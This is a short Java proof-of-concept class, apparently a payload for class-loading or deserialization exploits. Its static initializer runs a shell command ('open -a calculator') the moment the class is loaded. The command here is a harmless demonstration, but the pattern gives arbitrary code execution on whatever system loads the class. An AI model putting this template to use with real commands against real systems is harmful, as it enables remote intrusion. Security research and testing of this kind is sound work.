import java.io.IOException;

/**
 * Title: Poc
 * Descrption: TODO
 * Date:2020/2/28 12:30 下午
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class Poc {
    static {
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
